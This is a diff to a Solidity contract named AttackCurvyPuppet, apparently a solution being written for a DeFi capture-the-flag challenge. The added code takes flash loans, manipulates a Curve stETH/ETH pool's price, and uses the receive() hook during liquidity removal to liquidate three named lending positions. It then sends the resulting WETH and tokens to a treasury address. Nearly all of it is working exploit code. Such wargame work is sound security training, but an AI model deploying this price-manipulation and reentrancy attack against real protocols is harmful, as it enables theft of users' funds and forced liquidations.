@@ -272,10 +272,10 @@ contract AttackCurvyPuppet {
 
     function attack() public {
         // Allow leanding pool to pull collateral
-        IERC20(curvePool.lpToken()).approve(address(permit2), type(uint256).max);
+        IERC20(curvePool.lp_token()).approve(address(permit2), type(uint256).max);
 
-        permit2.apporve({
-            token: curvePool.lpToken(),
+        permit2.approve({
+            token: curvePool.lp_token(),
             spender: address(lending),
             amount: 5e18,
             expiration: uint48(block.timestamp)
@@ -293,7 +293,7 @@ contract AttackCurvyPuppet {
         modes[0] = 0;
         modes[1] = 0;
 
-        AaveV2.flashloan(address(this), assets, amounts, modes, address(this), bytes(""), 0);
+        AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);
         weth.transfer(treasury, weth.balanceOf(address(this)));
         curveLpToken.transfer(treasury, 1);
         dvt.transfer(treasury, 7500e18);
@@ -317,12 +317,41 @@ contract AttackCurvyPuppet {
         return true;
     }
 
-    function receiveFlashloan() external {
+    function receiveFlashloan(
+        address[] memory tokens,
+        uint256[] memory amounts,
+        uint256[] memory feeAmounts,
+        bytes memory userData
+    ) external {
+        manipulateCurvePool();
+        removeLiquidity();
 
+        weth.deposit{value: 37991 ether}();
+        weth.transfer(address(Balancer), 37991 ether);
+
+        uint256 ethAmount = 12963923469069977697655;
+        uint256 min_dy = 1; 
+        curvePool.exchange{value: ethAmount}(0, 1, ethAmount, min_dy);
+        weth.deposit{value: 20518 ether}();
+            console.log(" stETH balance2:",stETH.balanceOf(address(this)));
+            console.log(" wETH balance2:",weth.balanceOf(address(this)));         
+            console.log(" ETH balance2:",(address(this).balance));
+            console.log(" my LP balance2:", curveLpToken.balanceOf(address(this)));
     }
 
     receive() external payable {
-
+         if (msg.sender == address(curvePool)) {
+            console.log("LP token price during removing liquidity:", curvePool.get_virtual_price());
+        address[3] memory users = [
+            0x328809Bc894f92807417D2dAD6b7C998c1aFdac6,  // Alice
+            0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e,  // Bob
+            0xea475d60c118d7058beF4bDd9c32bA51139a74e0   // Charlie
+        ];
+        console.log("msg.sender",address(this));
+        for (uint256 i = 0; i < users.length; i++) {
+            lending.liquidate(users[i]);
+            console.log("Liquidated user:", users[i]);
+        }
+        }
     }
-
 }
